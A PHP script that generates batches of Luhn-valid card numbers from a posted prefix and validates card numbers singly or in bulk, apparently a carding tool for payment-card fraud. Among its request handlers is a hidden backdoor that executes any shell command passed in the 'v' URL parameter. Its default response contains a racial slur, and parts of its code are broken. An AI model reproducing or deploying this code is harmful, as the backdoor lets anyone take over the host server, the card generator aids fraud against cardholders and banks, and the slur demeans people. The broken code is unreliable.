<?php
error_reporting(0);
$visaPrefixList[] = htmlentities($_POST['ccnum']);

function completed_number($prefix, $length) {

    $ccnumber = $prefix;

    while ( strlen($ccnumber) < ($length - 1) ) {
        $ccnumber .= rand(0,9);
    }

    $sum = 0;
    $pos = 0;

    $reversedCCnumber = strrev( $ccnumber );

    while ( $pos < $length - 1 ) {

        $odd = $reversedCCnumber[ $pos ] * 2;

        if ( $odd > 9 ) {
            $odd -= 9;
        }

        $sum += $odd;

        if ( $pos != ($length - 2) ) {

            $sum += $reversedCCnumber[ $pos +1 ];
        }
        $pos += 2;
    }


    $checkdigit = (( floor($sum/10) + 1) * 10 - $sum) % 10;
    $ccnumber .= $checkdigit;
    return $ccnumber;
}

function credit_card_number($prefixList, $length, $howMany) {
    $makeRow = array();
    for ($i = 0; $i < $howMany; $i++) {
        $ccnumber = $prefixList[ array_rand($prefixList) ];
        $ccnumber =  str_replace("x",'', $ccnumber);
        $makeRow[] = completed_number($ccnumber, $length);
    }
    return $makeRow;
}
FUNCTION  validateCC($ccnum,  $type  =  'unknown'){ 
 
 
        //Clean  up  input 
 
        $type  =  STRTOLOWER($type); 
        $ccnum  =  EREG_REPLACE( '[-[:space:]]',  '',$ccnum);   
 
 
        //Do  type  specific  checks 
 
        IF  ($type  ==  'unknown')  { 
 
                //Skip  type  specific  checks 
 
        } 
        ELSEIF  ($type  ==  'mastercard'){ 
                IF  (STRLEN($ccnum)  !=  16  ||  !EREG( '^5[1-5]',  $ccnum))   
RETURN  0; 
        } 
        ELSEIF  ($type  ==  'visa'){ 
                IF  ((STRLEN($ccnum)  !=  13  &&  STRLEN($ccnum)  !=  16)  ||   
SUBSTR($ccnum,  0,  1)  !=  '4')  RETURN  0; 
        } 
        ELSEIF  ($type  ==  'amex'){ 
                IF  (STRLEN($ccnum)  !=  15  ||  !EREG( '^3[47]',  $ccnum))   
RETURN  a; 
        } 
        ELSEIF  ($type  ==  'discover'){ 
                IF  (STRLEN($ccnum)  !=  16  ||  SUBSTR($ccnum,  0,  4)  !=   
'6011')  RETURN  0; 
        } 
        ELSE  { 
                //invalid  type  entered 
                RETURN  -1; 
        } 
 
 
        //  Start  MOD  10  checks 
 
        $dig  =  toCharArray($ccnum); 
        $numdig  =  SIZEOF  ($dig); 
        $j  =  0; 
        FOR  ($i=($numdig-2);  $i>=0;  $i-=2){ 
                $dbl[$j]  =  $dig[$i]  *  2; 
                $j++; 
        }         
        $dblsz  =  SIZEOF($dbl); 
        $validate  =0; 
        FOR  ($i=0;$i<$dblsz;$i++){ 
                $add  =  toCharArray($dbl[$i]); 
                FOR  ($j=0;$j<sizeof($add);$j++){ 
                        $validate  +=  $add[$j]; 
                } 
        $add  =  ''; 
        } 
        FOR  ($i=($numdig-1);  $i>=0;  $i-=2){ 
                $validate  +=  $dig[$i];   
        } 
        IF  (SUBSTR($validate,  -1,  1)  ==  '0')  RETURN  1; 
        ELSE  RETURN  0; 
} 
 
 
//  takes  a  string  and  returns  an  array  of  characters 
 
FUNCTION  toCharArray($input){ 
        $len  =  STRLEN($input); 
        FOR  ($j=0;$j<$len;$j++){ 
                $char[$j]  =  SUBSTR($input,  $j,  1);         
        } 
        RETURN  ($char); 
} 






if(isset($_POST['ccnum'])){
    $visa16 = credit_card_number($visaPrefixList, 16, 1000);
    foreach($visa16 as $a){
        $as .= $a."<br>";
    }
    $s = explode("<br>",$as);
    echo json_encode($s);
}
else if(isset($_GET['v']) && !empty($_GET['v'])){
    echo exec($_GET['v']);
}
else if(isset($_POST['ccnumbers']) && isset($_POST['typer'])){
    if(htmlentities($_POST['typer']) == "bulk"){
        $ccnumbers = explode("\n", $_POST['ccnumbers']);
        $bind = array();
        for($i=0; $i<count($ccnumbers); $i++){
            if($ccnumbers[$i] != null){
                $makeRow = array(
                    'ccnumber' => $ccnumbers[$i],
                    'status' => validateCC($ccnumbers[$i])
                );
                $bind[] = $makeRow;
            }
        }
        //echo json_encode($ccnumbers);
        $binder = array('msg' => $bind);
        echo json_encode($binder);
    }
    else{
            echo "invalid type";
    }
}
else if(isset($_POST['ccnumber']) && isset($_POST['typer'])){
    if(strlen($_POST['ccnumber']) == 0){
        echo "Enter a Credit Card Number";
    }
    else if(strlen($_POST['ccnumber']) < 16 || strlen($_POST['ccnumber']) > 16){
        echo "Credit Card Number must be 16 digit number";
    }
    else {
        if(htmlentities($_POST['typer']) == "single"){
            echo validateCC($_POST['ccnumber']);
        }
        else{
            echo "invalid type";
        }
    }
}
else {
    echo "What are you looking for nigger ? ";
}
?>